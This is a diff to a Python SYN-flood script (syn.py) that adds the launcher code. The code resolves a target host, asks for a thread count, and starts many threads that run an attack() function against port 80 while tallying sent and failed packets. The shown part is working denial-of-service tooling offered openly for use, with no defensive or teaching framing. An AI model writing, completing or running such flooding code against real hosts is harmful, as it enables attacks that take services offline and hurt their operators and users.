@@ -52,7 +52,38 @@ def attack(target_ip, port):
                     failed_packets += 1
 
 if __name__ == "__main__":
-    # ... (unchanged)
+    if len(sys.argv) != 2:
+        print("Usage: python syn.py <target>")
+        sys.exit(1)
+
+    target = sys.argv[1]
+
+    try:
+        target_ip = socket.gethostbyname(target)
+    except socket.gaierror as e:
+        print("Error: Unable to resolve target IP for '{}'.\n{}".format(target, str(e)))
+        sys.exit(1)
+
+    print("Target IP: {}".format(target_ip))
+    print("Target Port: 80 (default)")
+
+    num_threads = int(input("Enter the number of threads for the attack: "))
+
+    global start_time
+    time_diff = 0
+    p_num = 0
+    successful_packets = 0
+    failed_packets = 0
+    mut = threading.Lock()
+    start_time = time.time()
+
+    # Start attack threads
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=attack, args=(target_ip, 80))
+        t.daemon = True
+        t.start()
+        threads.append(t)
 
     try:
         while True:
@@ -60,4 +91,3 @@ if __name__ == "__main__":
             time_diff = time.time() - start_time
     except KeyboardInterrupt:
         bilgi()
-        
